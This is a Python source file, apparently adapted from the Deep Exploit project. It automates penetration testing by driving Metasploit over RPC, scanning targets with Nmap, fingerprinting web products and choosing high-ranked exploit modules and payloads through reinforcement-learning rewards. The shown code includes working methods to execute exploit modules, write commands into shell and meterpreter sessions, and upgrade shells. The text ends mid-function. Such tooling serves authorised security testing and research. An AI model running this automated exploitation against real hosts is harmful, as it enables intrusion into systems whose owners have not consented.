import time
import pickle
import nmap3
import csv
import argparse
from collections import Counter
from time import sleep
import subprocess
from typing import List, Mapping, Any, Optional
from collections import defaultdict
import matplotlib.pyplot as plt
import sklearn
from sklearn.manifold import TSNE
import pandas as pd
from gtrxl_torch.gtrxl_torch import GTrXL

import torch
import pexpect, getpass

#import torch
import torch.nn as nn
from torch import optim
import torch.nn.functional as F
from os import environ
#from transformers import AutoConfig, AutoTokenizer, AutoModelForMaskedLM
#from huggingface_hub import snapshot_download

#import os
from glob import glob
import matplotlib.pyplot as plt
import joblib

import sys
import os
import time
import re
import copy
import json
import csv
import codecs
import random
import ipaddress
import configparser
import msgpack
import http.client
import threading
import numpy as np
import pandas as pd
import tensorflow as tf
from bs4 import BeautifulSoup
from docopt import docopt
from keras.models import *
from keras.layers import *
from keras import backend as K
from util import Utilty
from modules.VersionChecker import VersionChecker
from modules.VersionCheckerML import VersionCheckerML
from modules.ContentExplorer import ContentExplorer
#from CreateReport import CreateReport

# Warnning for TensorFlow acceleration is not shown.
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'
#assert environ["TRANSFORMERS_OFFLINE"] == "1"

# Index of target host's state (s).
ST_OS_TYPE = 0    # OS types (unix, linux, windows, osx..).
ST_SERV_NAME = 1  # Product name on Port.
ST_SERV_VER = 2   # Product version.
ST_MODULE = 3     # Exploit module types.
ST_TARGET = 4     # target types (0, 1, 2..).
# ST_STAGE = 5      # exploit's stage (normal, exploitation, post-exploitation).
NUM_STATES = 5    # Size of state.
NONE_STATE = None
NUM_ACTIONS = 0

# Reward
R_GREAT = 100  # Successful of Stager/Stage payload.
R_GOOD = 1     # Successful of Single payload.
R_BAD = -1     # Failure of payload.

# Stage of exploitation
S_NORMAL = -1
S_EXPLOIT = 0
S_PEXPLOIT = 1

# Label type of printing.
OK = 'ok'         # [*]
NOTE = 'note'     # [+]
FAIL = 'fail'     # [-]
WARNING = 'warn'  # [!]
NONE = 'none'     # No label.


#device = 'cpu'

#device = 'cuda' if torch.cuda.is_available() else 'cpu'
#print(device)
#torch.set_default_tensor_type('torch.cuda.FloatTensor')



def get_default_device() -> str:
    if torch.cuda.is_available():
        return 'cuda'
    elif getattr(torch.backends, 'mps', None) is not None and torch.backends.mps.is_available():
        return 'mps'
    else:
        return 'cpu'
    
    
    
device = get_default_device()

# Metasploit interface.
class Msgrpc:
    def __init__(self, option=[]):
        self.host = option.get('host') or "127.0.0.1"
        self.port = option.get('port') or 55552
        self.uri = option.get('uri') or "/api/"
        self.ssl = option.get('ssl') or False
        self.authenticated = False
        self.token = False
        self.headers = {"Content-type": "binary/message-pack"}
        if self.ssl:
            self.client = http.client.HTTPSConnection(self.host, self.port)
        else:
            self.client = http.client.HTTPConnection(self.host, self.port)
        self.util = Utilty()

        # Read config.ini.
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
            sys.exit(1)
        # Common setting value.
        self.msgrpc_user = config['Common']['msgrpc_user']
        self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.timeout = int(config['Common']['timeout'])
        self.con_retry = int(config['Common']['con_retry'])
        self.retry_count = 0
        self.console_id = 0

    # Call RPC API.
    def call(self, meth, origin_option):
        # Set API option.
        option = copy.deepcopy(origin_option)
        option = self.set_api_option(meth, option)

        # Send request.
        resp = self.send_request(meth, option, origin_option)
        return msgpack.unpackb(resp.read())

    def set_api_option(self, meth, option):
        if meth != 'auth.login':
            if not self.authenticated:
                self.util.print_message(FAIL, 'MsfRPC: Not Authenticated.')
                exit(1)
        if meth != 'auth.login':
            option.insert(0, self.token)
        option.insert(0, meth)
        return option

    # Send HTTP request.
    def send_request(self, meth, option, origin_option):
        params = msgpack.packb(option)
        resp = ''
        try:
            self.client.request("POST", self.uri, params, self.headers)
            resp = self.client.getresponse()
            self.retry_count = 0
        except Exception as err:
            while True:
                self.retry_count += 1
                if self.retry_count == self.con_retry:
                    self.util.print_exception(err, 'Retry count is over.')
                    exit(1)
                else:
                    # Retry.
                    self.util.print_message(WARNING, '{}/{} Retry "{}" call. reason: {}'.format(
                        self.retry_count, self.con_retry, option[0], err))
                    time.sleep(1.0)
                    if self.ssl:
                        self.client = http.client.HTTPSConnection(self.host, self.port)
                    else:
                        self.client = http.client.HTTPConnection(self.host, self.port)
                    if meth != 'auth.login':
                        self.login(self.msgrpc_user, self.msgrpc_pass)
                        option = self.set_api_option(meth, origin_option)
                        self.get_console()
                    resp = self.send_request(meth, option, origin_option)
                    break
        return resp

    # Log in to RPC Server.
    def login(self, user, password):
        ret = self.call('auth.login', [user, password])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = True
                self.token = ret.get(b'token')
                return True
            else:
                self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            self.util.print_exception(e, 'Failed: auth.login')
            exit(1)

    # Keep alive.
    def keep_alive(self):
        self.util.print_message(OK, 'Executing keep_alive..')
        _ = self.send_command(self.console_id, 'version\n', False)

    # Create MSFconsole.
    def get_console(self):
        # Create a console.
        ret = self.call('console.create', [])
        try:
            self.console_id = ret.get(b'id')
            _ = self.call('console.read', [self.console_id])
        except Exception as err:
            self.util.print_exception(err, 'Failed: console.create')
            exit(1)

    # Send Metasploit command.
    def send_command(self, console_id, command, visualization, sleep=0.1):
        _ = self.call('console.write', [console_id, command])
        time.sleep(1)
        ret = self.call('console.read', [console_id])
        print(ret)
        time.sleep(sleep)
        result = ''
        try:
            result = ret.get(b'data').decode('utf-8')
            if visualization:
                self.util.print_message(OK, 'Result of "{}":\n{}'.format(command, result))
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(command))
        return result

    # Get all modules.
    def get_module_list(self, module_type):
        ret = {}
        if module_type == 'exploit':
            ret = self.call('module.exploits', [])
        elif module_type == 'auxiliary':
            ret = self.call('module.auxiliary', [])
        elif module_type == 'post':
            ret = self.call('module.post', [])
        elif module_type == 'payload':
            ret = self.call('module.payloads', [])
        elif module_type == 'encoder':
            ret = self.call('module.encoders', [])
        elif module_type == 'nop':
            ret = self.call('module.nops', [])

        try:
            byte_list = ret[b'modules']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: Getting {} module list.'.format(module_type))
            exit(1)

    # Get module detail information.
    def get_module_info(self, module_type, module_name):
        return self.call('module.info', [module_type, module_name])

    # Get payload that compatible module.
    def get_compatible_payload_list(self, module_name):
        ret = self.call('module.compatible_payloads', [module_name])
        try:
            byte_list = ret[b'payloads']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: module.compatible_payloads.')
            return []

    # Get payload that compatible target.
    def get_target_compatible_payload_list(self, module_name, target_num):
        ret = self.call('module.target_compatible_payloads', [module_name, target_num])
        try:
            byte_list = ret[b'payloads']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: module.target_compatible_payloads.')
            return []

    # Get module options.
    def get_module_options(self, module_type, module_name):
        return self.call('module.options', [module_type, module_name])

    # Execute module.
    def execute_module(self, module_type, module_name, options):
        ret = self.call('module.execute', [module_type, module_name, options])
        try:
            job_id = ret[b'job_id']
            uuid = ret[b'uuid'].decode('utf-8')
            return job_id, uuid
        except Exception as e:
            if ret[b'error_code'] == 401:
                self.login(self.msgrpc_user, self.msgrpc_pass)
            else:
                self.util.print_exception(e, 'Failed: module.execute.')
                exit(1)

    # Get job list.
    def get_job_list(self):
        jobs = self.call('job.list', [])
        try:
            byte_list = jobs.keys()
            job_list = []
            for job_id in byte_list:
                job_list.append(int(job_id.decode('utf-8')))
            return job_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: job.list.')
            return []

    # Get job detail information.
    def get_job_info(self, job_id):
        return self.call('job.info', [job_id])

    # Stop job.
    def stop_job(self, job_id):
        return self.call('job.stop', [job_id])

    # Get session list.
    def get_session_list(self):
        return self.call('session.list', [])

    # Stop session.
    def stop_session(self, session_id):
        _ = self.call('session.stop', [str(session_id)])

    # Stop meterpreter session.
    def stop_meterpreter_session(self, session_id):
        _ = self.call('session.meterpreter_session_detach', [str(session_id)])

    # Execute shell.
    def execute_shell(self, session_id, cmd):
        ret = self.call('session.shell_write', [str(session_id), cmd])
        try:
            return ret[b'write_count'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return 'Failed'

    # Get executing shell result.
    def get_shell_result(self, session_id, read_pointer):
        ret = self.call('session.shell_read', [str(session_id), read_pointer])
        try:
            seq = ret[b'seq'].decode('utf-8')
            data = ret[b'data'].decode('utf-8')
            return seq, data
        except Exception as e:
            self.util.print_exception(e, 'Failed: session.shell_read.')
            return 0, 'Failed'

    # Execute meterpreter.
    def execute_meterpreter(self, session_id, cmd):
        ret = self.call('session.meterpreter_write', [str(session_id), cmd])
        try:
            return ret[b'result'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return 'Failed'

    # Execute single meterpreter.
    def execute_meterpreter_run_single(self, session_id, cmd):
        ret = self.call('session.meterpreter_run_single', [str(session_id), cmd])
        try:
            return ret[b'result'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return 'Failed'

    # Get executing meterpreter result.
    def get_meterpreter_result(self, session_id):
        ret = self.call('session.meterpreter_read', [str(session_id)])
        try:
            return ret[b'data'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: session.meterpreter_read')
            return None

    # Upgrade shell session to meterpreter.
    def upgrade_shell_session(self, session_id, lhost, lport):
        ret = self.call('session.shell_upgrade', [str(session_id), lhost, lport])
        try:
            return ret[b'result'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: session.shell_upgrade')
            return 'Failed'

    # Log out from RPC Server.
    def logout(self):
        ret = self.call('auth.logout', [self.token])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = False
                self.token = ''
                return True
            else:
                self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            self.util.print_exception(e, 'Failed: auth.logout')
            exit(1)

    # Disconnection.
    def termination(self, console_id):
        # Kill a console and Log out.
        _ = self.call('console.session_kill', [console_id])
        _ = self.logout()


# Metasploit's environment.
class Metasploit:
    def __init__(self, target_ip='127.0.0.1'):
        self.util = Utilty()
        self.rhost = target_ip
        # Read config.ini.
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
            sys.exit(1)
        # Common setting value.
        server_host = config['Common']['server_host']
        server_port = int(config['Common']['server_port'])
        self.msgrpc_user = config['Common']['msgrpc_user']
        self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.timeout = int(config['Common']['timeout'])
        self.max_attempt = int(config['Common']['max_attempt'])
        self.save_path = os.path.join(full_path, config['Common']['save_path'])
        self.save_file = os.path.join(self.save_path, config['Common']['save_file'])
        self.data_path = os.path.join(full_path, config['Common']['data_path'])
        if os.path.exists(self.data_path) is False:
            os.mkdir(self.data_path)
        self.plot_file = os.path.join(self.data_path, config['Common']['plot_file'])
        self.port_div_symbol = config['Common']['port_div']
        
        self.state_value = []
        self.count_episode = 0
        self.count = 0
        self.deny = []

        # Metasploit options setting value.
        self.lhost = server_host
        self.lport = int(config['Metasploit']['lport'])
        self.proxy_host = config['Metasploit']['proxy_host']
        self.proxy_port = int(config['Metasploit']['proxy_port'])
        self.prohibited_list = str(config['Metasploit']['prohibited_list']).split('@')
        self.path_collection = str(config['Metasploit']['path_collection']).split('@')

        # Nmap options setting value.
        self.nmap_command = config['Nmap']['command']
        self.nmap_timeout = config['Nmap']['timeout']
        self.nmap_2nd_command = config['Nmap']['second_command']
        self.nmap_2nd_timeout = config['Nmap']['second_timeout']

        # A3C setting value.
        self.train_worker_num = int(config['A3C']['train_worker_num'])
        self.train_max_num = int(config['A3C']['train_max_num'])
        self.train_max_steps = int(config['A3C']['train_max_steps'])
        self.train_tmax = int(config['A3C']['train_tmax'])
        self.test_worker_num = int(config['A3C']['test_worker_num'])
        self.greedy_rate = float(config['A3C']['greedy_rate'])
        self.eps_steps = int(self.train_max_num * self.greedy_rate)

        # State setting value.
        self.state = []                                            # Deep Exploit's state(s).
        self.os_type = str(config['State']['os_type']).split('@')  # OS type.
        self.os_real = len(self.os_type) - 1
        self.service_list = str(config['State']['services']).split('@')  # Product name.

        # Report setting value.
        self.report_test_path = os.path.join(full_path, config['Report']['report_test'])
        self.report_train_path = os.path.join(self.report_test_path, config['Report']['report_train'])
        if os.path.exists(self.report_train_path) is False:
            os.mkdir(self.report_train_path)
        self.scan_start_time = self.util.get_current_date()
        self.source_host= server_host

        self.client = Msgrpc({'host': server_host, 'port': server_port})  # Create Msgrpc instance.
        self.client.login(self.msgrpc_user, self.msgrpc_pass)  # Log in to RPC Server.
        self.client.get_console()                              # Get MSFconsole ID.
        self.buffer_seq = 0
        self.isPostExploit = False                             # Executing Post-Exploiting True/False.

    # Create exploit tree.
    def get_exploit_tree(self):
        self.util.print_message(NOTE, 'Get exploit tree.')
        exploit_tree = {}
        if os.path.exists(os.path.join(self.data_path, 'exploit_tree.json')) is False:
            for idx, exploit in enumerate(com_exploit_list):
                temp_target_tree = {'targets': []}
                temp_tree = {}
                # Set exploit module.
                use_cmd = 'use exploit/' + exploit + '\n'
                _ = self.client.send_command(self.client.console_id, use_cmd, False)

                # Get target.
                show_cmd = 'show targets\n'
                target_info = ''
                time_count = 0
                while True:
                    target_info = self.client.send_command(self.client.console_id, show_cmd, False)
                    if 'Exploit targets' in target_info:
                        break
                    if time_count == 5:
                        self.util.print_message(OK, 'Timeout: {0}'.format(show_cmd))
                        self.util.print_message(OK, 'No exist Targets.')
                        break
                    time.sleep(1.0)
                    time_count += 1
                target_list = self.cutting_strings(r'\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\r\n]', target_info)
                for target in target_list:
                    # Get payload list.
                    payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
                    temp_tree[target] = payload_list

                # Get options.
                options = self.client.get_module_options('exploit', exploit)
                key_list = options.keys()
                option = {}
                for key in key_list:
                    sub_option = {}
                    sub_key_list = options[key].keys()
                    for sub_key in sub_key_list:
                        if isinstance(options[key][sub_key], list):
                            end_option = []
                            for end_key in options[key][sub_key]:
                                end_option.append(end_key.decode('utf-8'))
                            sub_option[sub_key.decode('utf-8')] = end_option
                        else:
                            end_option = {}
                            if isinstance(options[key][sub_key], bytes):
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key].decode('utf-8')
                            else:
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key]

                    # User specify.
                    sub_option['user_specify'] = ""
                    option[key.decode('utf-8')] = sub_option

                # Add payloads and targets to exploit tree.
                temp_target_tree['target_list'] = target_list
                temp_target_tree['targets'] = temp_tree
                temp_target_tree['options'] = option
                exploit_tree[exploit] = temp_target_tree
                # Output processing status to console.
                self.util.print_message(OK, '{}/{} exploit:{}, targets:{}'.format(str(idx + 1),
                                                                                  len(com_exploit_list),
                                                                                  exploit,
                                                                                  len(target_list)))

            # Save exploit tree to local file.
            fout = codecs.open(os.path.join(self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
            json.dump(exploit_tree, fout, indent=4)
            fout.close()
            self.util.print_message(OK, 'Saved exploit tree.')
        else:
            # Get exploit tree from local file.
            local_file = os.path.join(self.data_path, 'exploit_tree.json')
            self.util.print_message(OK, 'Loaded exploit tree from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            exploit_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
        return exploit_tree

    # Get target host information.
    def get_target_info(self, rhost, proto_list, port_info):
        self.util.print_message(NOTE, 'Get target info.')
        target_tree = {}
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            # Examination product and version on the Web ports.
            path_list = ['' for idx in range(len(com_port_list))]
            # TODO: Crawling on the Post-Exploitation phase.
            if self.isPostExploit is False:
                # Create instances.
                version_checker = VersionChecker(self.util)
                version_checker_ml = VersionCheckerML(self.util)
                content_explorer = ContentExplorer(self.util)

                # Check web port.
                web_port_list = self.util.check_web_port(rhost, com_port_list, self.client)

                # Gather target url using Spider.
                web_target_info = self.util.run_spider(rhost, web_port_list, self.client)

                # Get HTTP responses and check products per web port.
                uniq_product = []
                for idx_target, target in enumerate(web_target_info):
                    web_prod_list = []
                    # Scramble.
                    target_list = target[2]
                    if self.util.is_scramble is True:
                        self.util.print_message(WARNING, 'Scramble target list.')
                        target_list = random.sample(target[2], len(target[2]))

                    # Cutting target url counts.
                    if self.util.max_target_url != 0 and self.util.max_target_url < len(target_list):
                        self.util.print_message(WARNING, 'Cutting target list {} to {}.'
                                                .format(len(target[2]), self.util.max_target_url))
                        target_list = target_list[:self.util.max_target_url]

                    # Identify product name/version per target url.
                    for count, target_url in enumerate(target_list):
                        self.util.print_message(NOTE, '{}/{} Start analyzing: {}'
                                                .format(count + 1, len(target_list), target_url))
                        self.client.keep_alive()

                        # Check target url.
                        parsed = util.parse_url(target_url)
                        if parsed is None:
                            continue

                        # Get HTTP response (header + body).
                        _, res_header, res_body = self.util.send_request('GET', target_url)

                        # Cutting response byte.
                        if self.util.max_target_byte != 0 and (self.util.max_target_byte < len(res_body)):
                            self.util.print_message(WARNING, 'Cutting response byte {} to {}.'
                                                    .format(len(res_body), self.util.max_target_byte))
                            res_body = res_body[:self.util.max_target_byte]

                        # Check product name/version using signature.
                        web_prod_list.extend(version_checker.get_product_name(parsed,
                                                                              res_header + res_body,
                                                                              self.client))

                        # Check product name/version using Machine Learning.
                        web_prod_list.extend(version_checker_ml.get_product_name(parsed,
                                                                                 res_header + res_body,
                                                                                 self.client))

                    # Check product name/version using default contents.
                    parsed = None
                    try:
                        parsed = util.parse_url(target[0])
                    except Exception as e:
                        self.util.print_exception(e, 'Parsed error : {}'.format(target[0]))
                        continue
                    web_prod_list.extend(content_explorer.content_explorer(parsed, target[0], self.client))

                    # Delete duplication.
                    tmp_list = []
                    for item in list(set(web_prod_list)):
                        tmp_item = item.split('@')
                        tmp = tmp_item[0] + ' ' + tmp_item[1] + ' ' + tmp_item[2]
                        if tmp not in tmp_list:
                            tmp_list.append(tmp)
                            uniq_product.append(item)

                # Assemble web product information.
                for idx, web_prod in enumerate(uniq_product):
                    web_item = web_prod.split('@')
                    proto_list.append('tcp')
                    port_info.append(web_item[0] + ' ' + web_item[1])
                    com_port_list.append(web_item[2] + self.port_div_symbol + str(idx))
                    path_list.append(web_item[3])

            # Create target info.
            target_tree = {'rhost': rhost, 'os_type': self.os_real}
            for port_idx, port_num in enumerate(com_port_list):
                temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'target_path': '', 'exploit': []}

                # Get product name.
                service_name = 'unknown'
                for (idx, service) in enumerate(self.service_list):
                    if service in port_info[port_idx].lower():
                        print(port_info[port_idx].lower())
                        service_name = service
                        break
                temp_tree['prod_name'] = service_name

                # Get product version.
                # idx=1 2.3.4, idx=2 4.7p1, idx=3 1.0.1f, idx4 2.0 or v1.3 idx5 3.X
                regex_list = [r'.*\s(\d{1,3}\.\d{1,3}\.\d{1,3}).*',
                              r'.*\s[a-z]?(\d{1,3}\.\d{1,3}[a-z]\d{1,3}).*',
                              r'.*\s[\w]?(\d{1,3}\.\d{1,3}\.\d[a-z]{1,3}).*',
                              r'.*\s[a-z]?(\d\.\d).*',
                              r'.*\s(\d\.[xX|\*]).*']
                version = 0.0
                output_version = 0.0
                for (idx, regex) in enumerate(regex_list):
                    version_raw = self.cutting_strings(regex, port_info[port_idx])
                    if len(version_raw) == 0:
                        continue
                    if idx == 0:
                        index = version_raw[0].rfind('.')
                        version = version_raw[0][:index] + version_raw[0][index + 1:]
                        output_version = version_raw[0]
                        break
                    elif idx == 1:
                        index = re.search(r'[a-z]', version_raw[0]).start()
                        version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                        output_version = version_raw[0]
                        break
                    elif idx == 2:
                        index = re.search(r'[a-z]', version_raw[0]).start()
                        version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                        index = version.rfind('.')
                        version = version_raw[0][:index] + version_raw[0][index:]
                        output_version = version_raw[0]
                        break
                    elif idx == 3:
                        version = self.cutting_strings(r'[a-z]?(\d\.\d)', version_raw[0])
                        version = version[0]
                        output_version = version_raw[0]
                        break
                    elif idx == 4:
                        version = version_raw[0].replace('X', '0').replace('x', '0').replace('*', '0')
                        version = version[0]
                        output_version = version_raw[0]
                temp_tree['version'] = float(version)

                # Get protocol type.
                temp_tree['protocol'] = proto_list[port_idx]

                if path_list is not None:
                    temp_tree['target_path'] = path_list[port_idx]

                # Get exploit module.
                module_list = []
                raw_module_info = ''
                idx = 0
                search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
                print(search_cmd)
                raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)     
                print(raw_module_info)
                module_list = self.extract_osmatch_module(self.cutting_strings(r'(exploit/.*)', raw_module_info))
                if service_name != 'unknown' and len(module_list) == 0:
                    self.util.print_message(WARNING, 'Can\'t load exploit module: {}'.format(service_name))
                    temp_tree['prod_name'] = 'unknown'

                for module in module_list:
                    if module[1] in {'excellent', 'great', 'good'}:
                        temp_tree['exploit'].append(module[0])
                target_tree[str(port_num)] = temp_tree

                # Output processing status to console.
                self.util.print_message(OK, 'Analyzing port {}/{}, {}/{}, '
                                            'Available exploit modules:{}'.format(port_num,
                                                                                  temp_tree['protocol'],
                                                                                  temp_tree['prod_name'],
                                                                                  output_version,
                                                                                  len(temp_tree['exploit'])))

            # Save target host information to local file.
            fout = codecs.open(os.path.join(self.data_path, 'target_info_' + rhost + '.json'), 'w', 'utf-8')
            json.dump(target_tree, fout, indent=4)
            fout.close()
            self.util.print_message(OK, 'Saved target tree.')
        else:
            # Get target host information from local file.
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()

        return target_tree

    # Get target host information for indicate port number.
    def get_target_info_indicate(self, rhost, proto_list, port_info, port=None, prod_name=None):
        self.util.print_message(NOTE, 'Get target info for indicate port number.')
        target_tree = {'origin_port': port}

        # Update "com_port_list".
        com_port_list = []
        for prod in prod_name.split('@'):
            temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'exploit': []}
            virtual_port = str(np.random.randint(999999999))
            com_port_list.append(virtual_port)

            # Get product name.
            service_name = 'unknown'
            for (idx, service) in enumerate(self.service_list):
                if service == prod.lower():
                   # print(prod.lower())
                    service_name = service
                    break
            temp_tree['prod_name'] = service_name

            # Get product version.
            temp_tree['version'] = float(0.0)

            # Get protocol type.
            temp_tree['protocol'] = 'tcp'

            # Get exploit module.
            module_list = []
            raw_module_info = ''
            idx = 0
            search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
            raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
            module_list = self.cutting_strings(r'(exploit/.*)', raw_module_info)
            if service_name != 'unknown' and len(module_list) == 0:
                continue
            for exploit in module_list:
                raw_exploit_info = exploit.split(' ')
                exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
                if exploit_info[2] in {'excellent', 'great', 'good'}:
                    temp_tree['exploit'].append(exploit_info[0])
            target_tree[virtual_port] = temp_tree

            # Output processing status to console.
            self.util.print_message(OK, 'Analyzing port {}/{}, {}, '
                                        'Available exploit modules:{}'.format(port,
                                                                              temp_tree['protocol'],
                                                                              temp_tree['prod_name'],
                                                                              len(temp_tree['exploit'])))

        # Save target host information to local file.
        with codecs.open(os.path.join(self.data_path, 'target_info_indicate_' + rhost + '.json'), 'w', 'utf-8') as fout:
            json.dump(target_tree, fout, indent=4)

        return target_tree, com_port_list

    # Get target OS name.
    def extract_osmatch_module(self, module_list):
        osmatch_module_list = []
        for module in module_list:
            raw_exploit_info = module.split(' ')
            exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
            os_type = exploit_info[0].split('/')[1]
            if self.os_real == 0 and os_type in ['windows', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 1 and os_type in ['unix', 'freebsd', 'bsdi', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 2 and os_type in ['solaris', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 3 and os_type in ['osx', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 4 and os_type in ['netware', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 5 and os_type in ['linux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 6 and os_type in ['irix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 7 and os_type in ['hpux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 8 and os_type in ['freebsd', 'unix', 'bsdi', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 9 and os_type in ['firefox', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 10 and os_type in ['dialup', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 11 and os_type in ['bsdi', 'unix', 'freebsd', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 12 and os_type in ['apple_ios', 'unix', 'osx', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 13 and os_type in ['android', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 14 and os_type in ['aix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 15:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        return osmatch_module_list

    # Parse.
    def cutting_strings(self, pattern, target):
        return re.findall(pattern, target)

    # Normalization.
    def normalization(self, target_idx):
        if target_idx == ST_OS_TYPE:
            os_num = int(self.state[ST_OS_TYPE])
            os_num_mean = len(self.os_type) / 2
            self.state[ST_OS_TYPE] = (os_num - os_num_mean) / os_num_mean
        if target_idx == ST_SERV_NAME:
            service_num = self.state[ST_SERV_NAME]
            service_num_mean = len(self.service_list) / 2
            self.state[ST_SERV_NAME] = (service_num - service_num_mean) / service_num_mean
        elif target_idx == ST_MODULE:
            prompt_num = self.state[ST_MODULE]
            prompt_num_mean = len(com_exploit_list) / 2
            self.state[ST_MODULE] = (prompt_num - prompt_num_mean) / prompt_num_mean

    # Execute Nmap.
    def execute_nmap(self, rhost, command, timeout):
        self.util.print_message(NOTE, 'Execute Nmap against {}'.format(rhost))
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            # Execute Nmap.
            self.util.print_message(OK, '{}'.format(command))
            self.util.print_message(OK, 'Start time: {}'.format(self.util.get_current_date()))
            _ = self.client.call('console.write', [self.client.console_id, command])

            time.sleep(3.0)
            time_count = 0
            while True:
                # Judgement of Nmap finishing.
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if (time_count % 5) == 0:
                        self.util.print_message(OK, 'Port scanning: {} [Elapsed time: {} s]'.format(rhost, time_count))
                        self.client.keep_alive()
                    if timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message(OK, 'Timeout   : {}'.format(command))
                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                        break

                    status = ret.get(b'busy')
                    if status is False:
                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                        time.sleep(5.0)
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: {}'.format(command))
                time.sleep(1.0)
                time_count += 1

            _ = self.client.call('console.destroy', [self.client.console_id])
            ret = self.client.call('console.create', [])
            try:
                self.client.console_id = ret.get(b'id')
            except Exception as e:
                self.util.print_exception(e, 'Failed: console.create')
                exit(1)
            _ = self.client.call('console.read', [self.client.console_id])
        else:
            self.util.print_message(OK, 'Nmap already scanned.')

    # Get port list from Nmap's XML result.
    def get_port_list(self, nmap_result_file, rhost):
        self.util.print_message(NOTE, 'Get port list from {}.'.format(nmap_result_file))
        global com_port_list
        port_list = []
        proto_list = []
        info_list = []
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            nmap_result = ''
            cat_cmd = 'cat ' + nmap_result_file + '\n'
            _ = self.client.call('console.write', [self.client.console_id, cat_cmd])
            time.sleep(3.0)
            time_count = 0
            while True:
                # Judgement of 'services' command finishing.
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if self.timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message(OK, 'Timeout: "{}"'.format(cat_cmd))
                        break

                    nmap_result += ret.get(b'data').decode('utf-8')
                    status = ret.get(b'busy')
                    if status is False:
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: console.read')
                time.sleep(1.0)
                time_count += 1

